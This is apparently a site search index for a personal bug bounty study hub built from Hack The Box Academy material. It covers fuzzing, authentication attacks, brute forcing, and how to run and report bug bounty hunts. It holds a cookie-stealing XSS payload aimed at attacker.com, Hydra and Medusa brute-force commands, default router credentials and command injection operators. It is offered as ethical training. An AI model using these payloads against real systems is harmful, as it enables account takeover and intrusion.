{"config":{"lang":["en"],"separator":"[\\s\\-]+","pipeline":["stopWordFilter"]},"docs":[{"location":"","title":"Bug Bounty Hub","text":"<p>Welcome to the Bug Bounty Hub! Explore various bug bounty projects and resources.</p>"},{"location":"#projects","title":"Projects","text":"<ul> <li>Bug Bounty Guide - Comprehensive guide for bug bounty hunting.</li> <li>Project 2 - Placeholder for future projects.</li> <li>Project 3 - Placeholder for future projects.</li> </ul>"},{"location":"bug-bounty-guide/","title":"Bug Bounty Guide","text":"<p>This is a comprehensive guide for bug bounty hunting, created with the assistance of AI (Grok) while following the Hack The Box Academy Bug Bounty Hunter Job Role Path. The cheat sheets originate from the course materials.</p>"},{"location":"bug-bounty-guide/#contents","title":"Contents","text":""},{"location":"bug-bounty-guide/#process","title":"Process","text":"<ul> <li>Bug Bounty Process</li> </ul>"},{"location":"bug-bounty-guide/#guides","title":"Guides","text":"<ul> <li>Information Gathering</li> <li>Cross-Site Scripting (XSS)</li> <li>SQL Injection </li> <li>Command Injections</li> <li>File Upload Attacks</li> <li>Server-side Attacks</li> <li>Login Brute Forcing</li> <li>Broken Authentication</li> <li>Web Attacks</li> <li>File Inclusion</li> <li>Session Security</li> <li>Web Service &amp; API Attacks</li> <li>Hacking WordPress</li> <li>Bug Bounty Reporting</li> </ul>"},{"location":"bug-bounty-guide/#informational-documents","title":"Informational Documents","text":"<ul> <li>Web Requests</li> <li>Introduction to Web Applications</li> <li>Using Web Proxies</li> <li>Attacking Web Applications with Ffuf</li> <li>JavaScript Deobfuscation</li> </ul>"},{"location":"bug-bounty-guide/#cheat-sheets","title":"Cheat Sheets","text":"<ul> <li>Web Requests</li> <li>Information Gathering</li> <li>JavaScript Deobfuscation</li> <li>Cross-Site Scripting (XSS)</li> <li>SQL Injection</li> <li>SQLMap</li> <li>Command Injection</li> <li>File Upload</li> <li>Server-Side</li> <li>Brute Forcing</li> <li>Broken Authentication</li> <li>Web Attacks</li> <li>File Inclusion</li> <li>WordPress</li> </ul>"},{"location":"bug-bounty-guide/attacking-web-applications-with-ffuf/","title":"Attacking Web Applications with Ffuf","text":"<p>Relative Cheat Sheet</p>"},{"location":"bug-bounty-guide/attacking-web-applications-with-ffuf/#overview","title":"Overview","text":"<p>Ffuf (Fuzz Faster U Fool) is a fast web fuzzer used to discover hidden files, directories, subdomains, and parameters on web applications.</p>"},{"location":"bug-bounty-guide/attacking-web-applications-with-ffuf/#web-fuzzing","title":"Web Fuzzing","text":"<ul> <li>Purpose: Identifies unlinked or hidden resources by sending multiple requests with varying inputs.</li> <li>Use Case: Finding backup files or admin panels.</li> </ul>"},{"location":"bug-bounty-guide/attacking-web-applications-with-ffuf/#directory-fuzzing","title":"Directory Fuzzing","text":"<ul> <li>Process: Uses wordlists to guess directory names (e.g., <code>/admin</code>, <code>/backup</code>).</li> <li>Benefit: Uncovers accessible but unadvertised directories.</li> </ul>"},{"location":"bug-bounty-guide/attacking-web-applications-with-ffuf/#page-fuzzing","title":"Page Fuzzing","text":"<ul> <li>Process: Fuzzes page names or extensions (e.g., <code>/login.php</code>, <code>/index.html</code>).</li> <li>Benefit: Detects dynamic pages or misconfigured file types.</li> </ul>"},{"location":"bug-bounty-guide/attacking-web-applications-with-ffuf/#recursive-fuzzing","title":"Recursive Fuzzing","text":"<ul> <li>Process: Recursively explores subdirectories with <code>-recursion</code>.</li> <li>Benefit: Maps deep site structure for comprehensive testing.</li> </ul>"},{"location":"bug-bounty-guide/attacking-web-applications-with-ffuf/#dns-records-and-sub-domain-fuzzing","title":"DNS Records and Sub-domain Fuzzing","text":"<ul> <li>Process: Fuzzes subdomains (e.g., <code>dev.example.com</code>) using DNS queries.</li> <li>Benefit: Reveals hidden or forgotten subdomains.</li> </ul>"},{"location":"bug-bounty-guide/attacking-web-applications-with-ffuf/#vhost-fuzzing","title":"Vhost Fuzzing","text":"<ul> <li>Process: Fuzzes Host headers to find virtual hosts on the same IP.</li> <li>Benefit: Identifies multiple sites with potentially different security.</li> </ul>"},{"location":"bug-bounty-guide/attacking-web-applications-with-ffuf/#filtering-results","title":"Filtering Results","text":"<ul> <li>Process: Use <code>-fs</code> to filter by response size or status to reduce noise.</li> <li>Benefit: Focuses on valid findings, ignoring irrelevant responses.</li> </ul>"},{"location":"bug-bounty-guide/attacking-web-applications-with-ffuf/#parameter-fuzzing-getpost","title":"Parameter Fuzzing (GET/POST)","text":"<ul> <li>Process: Fuzzes GET (<code>?id=FUZZ</code>) or POST (<code>-d 'id=FUZZ'</code>) parameters.</li> <li>Benefit: Discovers injectable parameters for exploitation.</li> </ul>"},{"location":"bug-bounty-guide/attacking-web-applications-with-ffuf/#value-fuzzing","title":"Value Fuzzing","text":"<ul> <li>Process: Fuzzes parameter values to test input validation.</li> <li>Benefit: Identifies weak validation leading to vulns like SQLi.</li> </ul>"},{"location":"bug-bounty-guide/attacking-web-applications-with-ffuf/#tools","title":"Tools","text":"<ul> <li>Ffuf (https://github.com/ffuf/ffuf) for setup and usage.</li> <li>SecLists (https://github.com/danielmiessler/SecLists) for wordlists.</li> </ul>"},{"location":"bug-bounty-guide/broken-auth-cheat/","title":"Broken Authentication Cheat Sheet","text":""},{"location":"bug-bounty-guide/broken-auth-cheat/#categories-of-authentication","title":"Categories of Authentication","text":"<ul> <li>Knowledge: passwords, PINs, ...</li> <li>Ownership: ID cards, TOTP</li> <li>Inherence: Biometric authentication</li> </ul>"},{"location":"bug-bounty-guide/broken-auth-cheat/#brute-force-attacks","title":"Brute-Force Attacks","text":"<ul> <li>User Enumeration</li> <li>Brute-Forcing Passwords</li> <li>Brute-Forcing Password Reset Tokens</li> <li>Brute-Forcing 2FA Codes</li> </ul>"},{"location":"bug-bounty-guide/broken-auth-cheat/#bypassing-brute-force-protection","title":"Bypassing Brute-Force Protection","text":"<ul> <li>Rate Limit: X-Forwarded-For HTTP Header</li> <li>CAPTCHAs: Look for CAPTCHA solution in HTML code</li> </ul>"},{"location":"bug-bounty-guide/broken-auth-cheat/#password-attacks","title":"Password Attacks","text":"<ul> <li>Default Credentials</li> <li>CIRT.net</li> <li>SecLists Default Credentials</li> <li>SCADA</li> <li>Vulnerable Password Reset</li> <li>Guessable Security Questions</li> <li>Username Injection in Reset Request</li> </ul>"},{"location":"bug-bounty-guide/broken-auth-cheat/#authentication-bypasses","title":"Authentication Bypasses","text":"<ul> <li>Accessing the protected page directly</li> <li>Manipulating HTTP Parameters to access protected pages</li> </ul>"},{"location":"bug-bounty-guide/broken-auth-cheat/#session-attacks","title":"Session Attacks","text":"<ul> <li>Brute-Forcing cookies with insufficient entropy</li> <li>Session Fixation</li> <li>Attacker obtains valid session identifier</li> <li>Attacker coerces victim to use this session identifier (social engineering)</li> <li>Victim authenticates to the vulnerable web application</li> <li>Attacker knows the victim's session identifier and can hijack their account</li> <li>Improper Session Timeout</li> <li>Sessions should expire after an appropriate time interval</li> <li>Session validity duration depends on the web application</li> </ul>"},{"location":"bug-bounty-guide/broken-authentication-guide/","title":"Broken Authentication","text":"<p>Relative Cheat Sheet</p>"},{"location":"bug-bounty-guide/broken-authentication-guide/#step-by-step-guide-for-testing-and-exploiting-broken-authentication-vulnerabilities","title":"Step-by-Step Guide for Testing and Exploiting Broken Authentication Vulnerabilities","text":""},{"location":"bug-bounty-guide/broken-authentication-guide/#1-understand-authentication-mechanisms","title":"1. Understand Authentication Mechanisms","text":"<ul> <li>Explanation: Authentication verifies identity via knowledge (passwords, PINs), ownership (TOTP, tokens), or inherence (biometrics). Broken authentication occurs when these are weakly implemented, allowing bypasses or unauthorized access.</li> <li>Why It's Done: Knowing the auth flow (e.g., session tokens, resets) helps identify flaws like weak passwords or missing validations.</li> <li>Example: A login form with no rate limiting or a predictable reset token.</li> </ul>"},{"location":"bug-bounty-guide/broken-authentication-guide/#2-enumerate-valid-usernames","title":"2. Enumerate Valid Usernames","text":"<ul> <li>Explanation: Submit usernames with invalid passwords to detect response differences (e.g., \"Invalid password\" vs \"User not found\") or timing variations.</li> <li>Why It's Done: Valid usernames enable targeted brute forcing or social engineering.</li> <li>Example: Test <code>/login?user=admin</code> vs <code>testuser</code> to see different error messages.</li> </ul>"},{"location":"bug-bounty-guide/broken-authentication-guide/#3-brute-force-passwords-or-tokens","title":"3. Brute Force Passwords or Tokens","text":"<ul> <li>Explanation: Use tools like Hydra or Medusa to guess passwords or reset tokens for enumerated users.</li> <li>Why It's Done: Weak credentials or tokens grant unauthorized access.</li> <li>Example: <code>hydra -l admin -P passwords.txt http-post-form \"/login:user=^USER^&amp;pass=^PASS^:F=invalid\"</code>.</li> </ul>"},{"location":"bug-bounty-guide/broken-authentication-guide/#4-test-password-reset-mechanisms","title":"4. Test Password Reset Mechanisms","text":"<ul> <li>Explanation: Submit reset requests to check for guessable tokens, weak security questions, or injectable fields (e.g., username in reset URL).</li> <li>Why It's Done: Flawed resets allow bypassing login via token guessing or manipulation.</li> <li>Example: <code>/reset?user=admin&amp;token=123</code>\u2014try changing <code>user</code> to another account.</li> </ul>"},{"location":"bug-bounty-guide/broken-authentication-guide/#5-test-default-or-weak-credentials","title":"5. Test Default or Weak Credentials","text":"<ul> <li>Explanation: Attempt common credentials (e.g., admin:admin) or check for known defaults in the cheat sheet (e.g., Cisco:cisco).</li> <li>Why It's Done: Default or weak credentials are common in misconfigured systems.</li> <li>Example: Login with <code>admin:password</code> on a router admin panel.</li> </ul>"},{"location":"bug-bounty-guide/broken-authentication-guide/#6-bypass-authentication-logic","title":"6. Bypass Authentication Logic","text":"<ul> <li>Explanation: Access protected pages directly (e.g., <code>/admin</code>) or modify parameters (e.g., <code>role=user</code> to <code>role=admin</code>) to bypass checks.</li> <li>Why It's Done: Weak access controls allow unauthorized entry without credentials.</li> <li>Example: Change <code>GET /profile?role=user</code> to <code>role=admin</code> in Burp.</li> </ul>"},{"location":"bug-bounty-guide/broken-authentication-guide/#7-exploit-session-attacks","title":"7. Exploit Session Attacks","text":"<ul> <li>Explanation: Test for session fixation (set cookie pre-login, check if persists) or hijacking (steal via XSS or predictable IDs).</li> <li>Why It's Done: Compromised sessions grant persistent access.</li> <li>Example: XSS payload <code>&lt;script&gt;document.location='attacker.com/?c='+document.cookie&lt;/script&gt;</code> to steal session.</li> </ul>"},{"location":"bug-bounty-guide/broken-authentication-guide/#8-test-session-timeout-and-entropy","title":"8. Test Session Timeout and Entropy","text":"<ul> <li>Explanation: Leave sessions idle to check expiration, or brute force session IDs for low entropy.</li> <li>Why It's Done: Long-lived or predictable sessions increase hijacking risk.</li> <li>Example: Generate sequential IDs to test if valid.</li> </ul>"},{"location":"bug-bounty-guide/broken-authentication-guide/#9-chain-with-other-vulnerabilities","title":"9. Chain with Other Vulnerabilities","text":"<ul> <li>Explanation: Combine with XSS (steal sessions) or CSRF (force actions) for escalation.</li> <li>Why It's Done: Amplifies impact, like account takeover.</li> <li>Example: XSS to deliver CSRF payload changing user settings.</li> </ul>"},{"location":"bug-bounty-guide/broken-authentication-guide/#10-assess-prevention-measures","title":"10. Assess Prevention Measures","text":"<ul> <li>Explanation: Check for strong passwords, 2FA, rate limits, secure cookies (HttpOnly, Secure flags), and proper timeouts.</li> <li>Why It's Done: Informs remediation to strengthen auth.</li> <li>Example: Recommend 2FA and lockouts after 5 failed attempts.</li> </ul> <p>This guide, based on PortSwigger Web Security Academy and the provided cheat sheet, provides a detailed process for testing broken authentication. Test ethically within scope.</p>"},{"location":"bug-bounty-guide/brute-forcing-cheat/","title":"Login Brute Forcing Cheat Sheet","text":""},{"location":"bug-bounty-guide/brute-forcing-cheat/#what-is-brute-forcing","title":"What is Brute Forcing?","text":"<p>A trial-and-error method used to crack passwords, login credentials, or encryption keys by systematically trying every possible combination of characters.</p>"},{"location":"bug-bounty-guide/brute-forcing-cheat/#factors-influencing-brute-force-attacks","title":"Factors Influencing Brute Force Attacks","text":"<ul> <li>Complexity of the password or key</li> <li>Computational power available to the attacker</li> <li>Security measures in place</li> </ul>"},{"location":"bug-bounty-guide/brute-forcing-cheat/#how-brute-forcing-works","title":"How Brute Forcing Works","text":"<ol> <li>Start: The attacker initiates the brute force process.</li> <li>Generate Possible Combination: The software generates a potential password or key combination.</li> <li>Apply Combination: The generated combination is attempted against the target system.</li> <li>Check if Successful: The system evaluates the attempted combination.</li> <li>Access Granted (if successful): The attacker gains unauthorized access.</li> <li>End (if unsuccessful): The process repeats until the correct combination is found or the attacker gives up.</li> </ol>"},{"location":"bug-bounty-guide/brute-forcing-cheat/#types-of-brute-forcing","title":"Types of Brute Forcing","text":"Attack Type Description Best Used When Simple Brute Force Tries every possible character combination in a set (e.g., lowercase, uppercase, numbers, symbols). When there is no prior information about the password. Dictionary Attack Uses a pre-compiled list of common passwords. When the password is likely weak or follows common patterns. Hybrid Attack Combines brute force and dictionary attacks, adding numbers or symbols to dictionary words. When the target uses slightly modified versions of common passwords. Credential Stuffing Uses leaked credentials from other breaches to access different services where users may have reused passwords. When you have a set of leaked credentials, and the target may reuse passwords. Password Spraying Attempts common passwords across many accounts to avoid detection. When account lockout policies are in place. Rainbow Table Attack Uses precomputed tables of password hashes to reverse them into plaintext passwords. When a large number of password hashes need cracking, and storage for tables is available. Reverse Brute Force Targets a known password against multiple usernames. When there\u2019s a suspicion of password reuse across multiple accounts. Distributed Brute Force Distributes brute force attempts across multiple machines to speed up the process. When the password is highly complex, and a single machine isn't powerful enough."},{"location":"bug-bounty-guide/brute-forcing-cheat/#default-credentials","title":"Default Credentials","text":"Device Username Password Linksys Router admin admin Netgear Router admin password TP-Link Router admin admin Cisco Router cisco cisco Ubiquiti UniFi AP ubnt ubnt"},{"location":"bug-bounty-guide/brute-forcing-cheat/#brute-forcing-tools","title":"Brute-Forcing Tools","text":""},{"location":"bug-bounty-guide/brute-forcing-cheat/#hydra","title":"Hydra","text":"<p>Fast network login cracker. Supports numerous protocols. Uses parallel connections for speed. Flexible and adaptable. Relatively easy to use.</p> <pre><code>hydra [-l LOGIN|-L FILE] [-p PASS|-P FILE] [-C FILE] -m MODULE [service://server[:PORT][/OPT]]\n</code></pre>"},{"location":"bug-bounty-guide/brute-forcing-cheat/#hydra-service","title":"Hydra Service","text":"Service/Protocol Description Example Command ftp File Transfer Protocol (FTP). Used to brute-force login credentials for FTP services, commonly used to transfer files over a network. <code>hydra -l admin -P /path/to/password_list.txt ftp://192.168.1.100</code> ssh Secure Shell (SSH). Targets SSH services to brute-force credentials, commonly used for secure remote login to systems. <code>hydra -l root -P /path/to/password_list.txt ssh://192.168.1.100</code> http-get/post HTTP Web Services. Used to brute-force login credentials for HTTP web login forms using either GET or POST requests. <code>hydra -l admin -P /path/to/password_list.txt 127.0.0.1 http-post-form \"/login.php:user=^USER^&amp;pass=^PASS^:F=incorrect\"</code>"},{"location":"bug-bounty-guide/brute-forcing-cheat/#medusa","title":"Medusa","text":"<p>Fast, massively parallel, modular login brute-forcer. Supports a wide array of services.</p> <pre><code>medusa [-h host|-H file] [-u username|-U file] [-p password|-P file] [-C file] -M module [OPT]\n</code></pre>"},{"location":"bug-bounty-guide/brute-forcing-cheat/#medusa-module","title":"Medusa Module","text":"Module Service/Protocol Description Example Command ssh Secure Shell (SSH) Brute force SSH login for the admin user. <code>medusa -h 192.168.1.100 -u admin -P passwords.txt -M ssh</code> ftp File Transfer Protocol (FTP) Brute force FTP with multiple usernames and passwords using 5 parallel threads. <code>medusa -h 192.168.1.100 -U users.txt -P passwords.txt -M ftp -t 5</code> rdp Remote Desktop Protocol (RDP) Brute force RDP login. <code>medusa -h 192.168.1.100 -u admin -P passwords.txt -M rdp</code> http-get HTTP Web Services Brute force HTTP Basic Authentication. <code>medusa -h www.example.com -U users.txt -P passwords.txt -M http -m GET</code> ssh Secure Shell (SSH) Stop after the first valid SSH login is found. <code>medusa -h 192.168.1.100 -u admin -P passwords.txt -M ssh -f</code>"},{"location":"bug-bounty-guide/brute-forcing-cheat/#custom-wordlists","title":"Custom Wordlists","text":""},{"location":"bug-bounty-guide/brute-forcing-cheat/#username-anarchy","title":"Username Anarchy","text":"<p>Generates potential usernames based on a target's name. | Command | Description | |---------|-------------| | <code>username-anarchy Jane Smith</code> | Generate possible usernames for \"Jane Smith\" | | <code>username-anarchy -i names.txt</code> | Use a file (names.txt) with names for input. Can handle space, CSV, or TAB delimited names. | | <code>username-anarchy -a --country us</code> | Automatically generate usernames using common names from the US dataset. | | <code>username-anarchy -l</code> | List available username format plugins. | | <code>username-anarchy -f format1,format2</code> | Use specific format plugins for username generation (comma-separated). | | <code>username-anarchy -@ example.com</code> | Append @example.com as a suffix to each username. | | <code>username-anarchy --case-insensitive</code> | Generate usernames in case-insensitive (lowercase) format. |</p>"},{"location":"bug-bounty-guide/brute-forcing-cheat/#cupp-common-user-passwords-profiler","title":"CUPP (Common User Passwords Profiler)","text":"<p>Creates personalized password wordlists based on gathered intelligence. | Command | Description | |---------|-------------| | <code>cupp -i</code> | Generate wordlist based on personal information (interactive mode). | | <code>cupp -w profiles.txt</code> | Generate a wordlist from a predefined profile file. | | <code>cupp -l</code> | Download popular password lists like rockyou.txt. |</p>"},{"location":"bug-bounty-guide/brute-forcing-cheat/#password-policy-filtering","title":"Password Policy Filtering","text":"<p>Password policies often dictate specific requirements for password strength, such as minimum length, inclusion of certain character types, or exclusion of common patterns. grep combined with regular expressions can filter wordlists to identify passwords that adhere to a given policy.</p>"},{"location":"bug-bounty-guide/brute-forcing-cheat/#policy-requirements-and-grep-regex-patterns","title":"Policy Requirements and Grep Regex Patterns","text":"Policy Requirement Grep Regex Pattern Explanation Minimum Length (e.g., 8 characters) <code>grep -E '^.{8,}$' wordlist.txt</code> <code>^</code> matches the start of the line, <code>.</code> matches any character, <code>{8,}</code> matches 8 or more occurrences, <code>$</code> matches the end of the line. At Least One Uppercase Letter <code>grep -E '[A-Z]' wordlist.txt</code> <code>[A-Z]</code> matches any uppercase letter. At Least One Lowercase Letter <code>grep -E '[a-z]' wordlist.txt</code> <code>[a-z]</code> matches any lowercase letter. At Least One Digit <code>grep -E '[0-9]' wordlist.txt</code> <code>[0-9]</code> matches any digit. At Least One Special Character <code>grep -E '[!@#$%^&amp;*()_+-=[]{};':\"\\,.&lt;&gt;/?]' wordlist.txt</code> <code>[!@#$%^&amp;*()_+-=[]{};':\"\\,.&lt;&gt;/?]</code> matches any special character (symbol). No Consecutive Repeated Characters <code>grep -E '(.)\\1' wordlist.txt</code> <code>(.)</code> captures any character, <code>\\1</code> matches the previously captured character. This pattern will match any line with consecutive repeated characters. Use <code>grep -v</code> to invert the match. Exclude Common Patterns (e.g., \"password\") <code>grep -v -i 'password' wordlist.txt</code> <code>-v</code> inverts the match, <code>-i</code> makes the search case-insensitive. This pattern will exclude any line containing \"password\" (or \"Password\", \"PASSWORD\", etc.). Exclude Dictionary Words <code>grep -v -f dictionary.txt wordlist.txt</code> <code>-f</code> reads patterns from a file. <code>dictionary.txt</code> should contain a list of common dictionary words, one per line. Combination of Requirements <code>grep -E '^.{8,}$' wordlist.txt | grep -E '[A-Z]'</code> Filters a wordlist to meet multiple password policy requirements. Ensures each word has a minimum length of 8 characters and contains at least one uppercase letter."},{"location":"bug-bounty-guide/bug-bounty-process/","title":"Bug Bounty Process","text":""},{"location":"bug-bounty-guide/bug-bounty-process/#step-by-step-guide-for-bug-bounty-hunting","title":"Step-by-Step Guide for Bug Bounty Hunting","text":""},{"location":"bug-bounty-guide/bug-bounty-process/#1-understand-the-bug-bounty-process","title":"1. Understand the Bug Bounty Process","text":"<ul> <li>Explanation: Bug bounty hunting involves identifying, exploiting, and reporting vulnerabilities in programs on platforms like HackerOne or Bugcrowd for rewards. It follows a structured workflow from scoping to follow-up.</li> <li>Why It's Done: A systematic process ensures efficient, ethical hunting, maximizing findings and bounties while minimizing risks.</li> <li>Example: Participating in a program like Google's to hunt for XSS or RCE.</li> </ul>"},{"location":"bug-bounty-guide/bug-bounty-process/#2-define-the-scope","title":"2. Define the Scope","text":"<ul> <li>Explanation: Review the program's policy for in-scope assets (domains, APIs, apps) and out-of-scope items (e.g., DoS attacks). Note rules on testing intensity or disclosure.</li> <li>Why It's Done: Ensures legal compliance and focuses efforts on reward-eligible areas.</li> <li>Example: Scope limited to <code>*.example.com</code>; test only those domains.</li> </ul>"},{"location":"bug-bounty-guide/bug-bounty-process/#3-perform-reconnaissance","title":"3. Perform Reconnaissance","text":"<ul> <li>Explanation: Gather intel on targets using passive (CT logs, WHOIS) and active (subdomain brute-force) methods to map assets, tech stack, and endpoints.</li> <li>Why It's Done: Builds a target profile, uncovering hidden subdomains or misconfigs for targeted attacks.</li> <li>Example: Use crt.sh for subdomains; link to Information Gathering Guide and Cheat Sheet.</li> </ul>"},{"location":"bug-bounty-guide/bug-bounty-process/#4-map-the-application","title":"4. Map the Application","text":"<ul> <li>Explanation: Proxy traffic (Burp/ZAP) to understand layout, fuzz endpoints (ffuf), and analyze JS for client-side logic.</li> <li>Why It's Done: Reveals structure, inputs, and flows for vuln discovery.</li> <li>Example: Intercept login requests; link to Using Web Proxies, Attacking with Ffuf, and JavaScript Deobfuscation.</li> </ul>"},{"location":"bug-bounty-guide/bug-bounty-process/#5-scan-for-vulnerabilities","title":"5. Scan for Vulnerabilities","text":"<ul> <li>Explanation: Use automated tools (Burp Scanner, WPScan) and manual testing for common vulns (XSS, SQLi, etc.), prioritizing based on recon.</li> <li>Why It's Done: Identifies exploitable issues efficiently.</li> <li>Example: Scan for XSS in forms; link to guides like Cross-Site Scripting (XSS), SQL Injection, Command Injections, File Upload Attacks, Server-side Attacks, Login Brute Forcing, Broken Authentication, Web Attacks, File Inclusion, Session Security, Web Service &amp; API Attacks, Hacking WordPress, and relevant cheat sheets.</li> </ul>"},{"location":"bug-bounty-guide/bug-bounty-process/#6-exploit-vulnerabilities","title":"6. Exploit Vulnerabilities","text":"<ul> <li>Explanation: Develop PoCs to confirm impact (e.g., data exfil, RCE), chain vulns (XSS + CSRF), and test boundaries.</li> <li>Why It's Done: Proves real-world risk for reports.</li> <li>Example: Chain XSS for cookie theft; reference exploitation steps in linked guides.</li> </ul>"},{"location":"bug-bounty-guide/bug-bounty-process/#7-report-findings","title":"7. Report Findings","text":"<ul> <li>Explanation: Write detailed reports with title, description, PoC, impact, and remediation; submit via platform.</li> <li>Why It's Done: Communicates vulns for fixes and bounties.</li> <li>Example: XSS report with PoC; link to Bug Bounty Reporting Guide.</li> </ul>"},{"location":"bug-bounty-guide/bug-bounty-process/#8-interact-with-the-program","title":"8. Interact with the Program","text":"<ul> <li>Explanation: Respond to triage queries, provide clarifications, and maintain professional communication.</li> <li>Why It's Done: Builds rapport and resolves issues for approval.</li> <li>Example: Supply video PoC if requested.</li> </ul>"},{"location":"bug-bounty-guide/bug-bounty-process/#9-follow-up-and-retest","title":"9. Follow-Up and Retest","text":"<ul> <li>Explanation: Monitor fix status; retest if allowed to verify resolution.</li> <li>Why It's Done: Ensures vulns are fixed; may earn additional bounties.</li> <li>Example: Retest SQLi post-fix.</li> </ul>"},{"location":"bug-bounty-guide/bug-bounty-process/#10-learn-and-iterate","title":"10. Learn and Iterate","text":"<ul> <li>Explanation: Review feedback, update methodologies, and track progress.</li> <li>Why It's Done: Improves skills for future hunts.</li> <li>Example: Analyze rejected reports for improvements.</li> </ul> <p>Test ethically within scope.</p>"},{"location":"bug-bounty-guide/bug-bounty-reporting-guide/","title":"Bug Bounty Reporting","text":""},{"location":"bug-bounty-guide/bug-bounty-reporting-guide/#step-by-step-guide-for-writing-effective-bug-bounty-reports","title":"Step-by-Step Guide for Writing Effective Bug Bounty Reports","text":""},{"location":"bug-bounty-guide/bug-bounty-reporting-guide/#1-understand-the-importance-of-a-good-report","title":"1. Understand the Importance of a Good Report","text":"<ul> <li>Explanation: A well-crafted bug bounty report communicates the vulnerability clearly to the program\u2019s triage team, increasing the likelihood of acceptance and appropriate bounty rewards. It should be concise, professional, and demonstrate the issue\u2019s severity and impact.</li> <li>Why It's Done: A clear report ensures the organization understands the vulnerability, can reproduce it, and prioritizes fixing it. Poor reports may be rejected or misunderstood.</li> <li>Example: A vague XSS report might be ignored, while a detailed one with a proof of concept (PoC) gets attention.</li> </ul>"},{"location":"bug-bounty-guide/bug-bounty-reporting-guide/#2-craft-a-descriptive-vulnerability-title","title":"2. Craft a Descriptive Vulnerability Title","text":"<ul> <li>Explanation: Create a title that summarizes the vulnerability, including its type, affected component (e.g., domain, endpoint, parameter), and potential impact. Be specific but concise to grab attention.</li> <li>Why It's Done: The title is the first thing triagers see; it sets expectations and helps categorize the issue.</li> <li>Example: \u201cStored XSS in Comment Section of example.com/blog Allowing Cookie Theft\u201d clearly states the vuln type, location, and impact.</li> </ul>"},{"location":"bug-bounty-guide/bug-bounty-reporting-guide/#3-include-cwe-and-cvss-score","title":"3. Include CWE and CVSS Score","text":"<ul> <li>Explanation: Reference the Common Weakness Enumeration (CWE) to categorize the vulnerability type (e.g., CWE-79 for XSS). Calculate the Common Vulnerability Scoring System (CVSS) score to quantify severity (using tools like CVSS Calculator).</li> <li>Why It's Done: CWE provides a standard classification, while CVSS communicates severity (e.g., Low, Medium, High, Critical), aiding prioritization.</li> <li>Example: For XSS, use CWE-79 and CVSS 6.1 (Medium) if it allows session hijacking without user interaction.</li> </ul>"},{"location":"bug-bounty-guide/bug-bounty-reporting-guide/#4-write-a-clear-vulnerability-description","title":"4. Write a Clear Vulnerability Description","text":"<ul> <li>Explanation: Explain the vulnerability\u2019s cause, how it occurs, and the affected component. Include technical details like the endpoint, parameter, or misconfiguration, avoiding overly complex jargon.</li> <li>Why It's Done: Helps triagers understand the root cause and context, making it easier to validate and fix.</li> <li>Example: \u201cThe comment input on /blog/post/123 lacks output encoding, allowing injection of arbitrary JavaScript that executes in other users\u2019 browsers.\u201d</li> </ul>"},{"location":"bug-bounty-guide/bug-bounty-reporting-guide/#5-provide-a-proof-of-concept-poc","title":"5. Provide a Proof of Concept (PoC)","text":"<ul> <li>Explanation: Detail step-by-step instructions to reproduce the vulnerability, including tools, payloads, or requests. Use screenshots, videos, or logs for clarity, ensuring the PoC is non-destructive.</li> <li>Why It's Done: A reproducible PoC proves the vulnerability exists and helps developers verify it quickly.</li> <li>Example: For stored XSS: \u201c1. Navigate to /blog/post/123. 2. Submit comment <code>&lt;script&gt;alert('XSS')&lt;/script&gt;</code>. 3. Reload page to see alert.\u201d</li> </ul>"},{"location":"bug-bounty-guide/bug-bounty-reporting-guide/#6-elaborate-on-impact","title":"6. Elaborate on Impact","text":"<ul> <li>Explanation: Describe what an attacker could achieve, focusing on business impact (e.g., data theft, account takeover) and maximum damage (e.g., chained exploits). Quantify affected users or systems if possible.</li> <li>Why It's Done: Demonstrates severity to justify bounty and prioritize fixes.</li> <li>Example: \u201cStored XSS allows stealing user cookies, leading to account takeover for all blog visitors, potentially exposing sensitive user data.\u201d</li> </ul>"},{"location":"bug-bounty-guide/bug-bounty-reporting-guide/#7-suggest-remediation-optional","title":"7. Suggest Remediation (Optional)","text":"<ul> <li>Explanation: Recommend fixes, like input validation, output encoding, or configuration changes. Reference standards like OWASP guidelines.</li> <li>Why It's Done: Shows goodwill and helps developers address the issue, though not always required in bug bounty programs.</li> <li>Example: For XSS: \u201cImplement output encoding with a library like OWASP ESAPI and enforce a strict Content Security Policy (CSP).\u201d</li> </ul>"},{"location":"bug-bounty-guide/bug-bounty-reporting-guide/#8-reference-example-reports","title":"8. Reference Example Reports","text":"<ul> <li>Explanation: Study high-quality report templates to structure your submission. Use examples like those from Hack The Box Academy for stored XSS, CSRF, or RCE.</li> <li>Why It's Done: Well-structured reports increase acceptance rates and clarity.</li> <li>Example: Review the example reports listed below for formatting.</li> </ul>"},{"location":"bug-bounty-guide/bug-bounty-reporting-guide/#9-submit-through-the-programs-platform","title":"9. Submit Through the Program\u2019s Platform","text":"<ul> <li>Explanation: Use the bug bounty platform (e.g., HackerOne, Bugcrowd) to submit the report, following their guidelines for format and required fields.</li> <li>Why It's Done: Ensures the report reaches the right team and complies with program rules, avoiding delays or rejections.</li> <li>Example: Submit via HackerOne\u2019s form, attaching PoC screenshots or a video.</li> </ul>"},{"location":"bug-bounty-guide/bug-bounty-reporting-guide/#10-interact-professionally-with-triagers","title":"10. Interact Professionally with Triagers","text":"<ul> <li>Explanation: Respond promptly to triage team requests for clarification or additional details. Be polite and provide further PoCs if needed.</li> <li>Why It's Done: Builds trust and increases likelihood of bounty approval.</li> <li>Example: If asked for more details, provide additional steps or a video demonstrating the vuln.</li> </ul>"},{"location":"bug-bounty-guide/bug-bounty-reporting-guide/#11-monitor-for-fixes-and-retest","title":"11. Monitor for Fixes and Retest","text":"<ul> <li>Explanation: After submission, check if the program allows retesting post-fix. Verify if the vulnerability is resolved.</li> <li>Why It's Done: Ensures the fix is effective and may lead to additional rewards for follow-up reports.</li> <li>Example: Retest XSS payload post-fix to confirm it\u2019s escaped.</li> </ul>"},{"location":"bug-bounty-guide/bug-bounty-reporting-guide/#example-reports","title":"Example Reports","text":"<ul> <li>Reporting Stored XSS</li> <li>Reporting CSRF</li> <li>Reporting RCE</li> </ul> <p>This guide, inspired by Hack The Box Academy and aligned with OWASP best practices, equips hunters to craft effective bug bounty reports. Always adhere to program scope and ethical guidelines.</p>"},{"location":"bug-bounty-guide/cmd-injection-cheat/","title":"Command Injections Cheat Sheet","text":""},{"location":"bug-bounty-guide/cmd-injection-cheat/#injection-operators","title":"Injection Operators","text":"Injection Operator Injection Character URL-Encoded Character Executed Command Semicolon ; %3b Both New Line \\n %0a Both Background &amp; %26 Both (second output generally shown first) Pipe %7c AND &amp;&amp; %26%26 Both (only if first succeeds) OR Sub-Shell `` %60%60 Both (Linux-only) Sub-Shell $() %24%28%29 Both 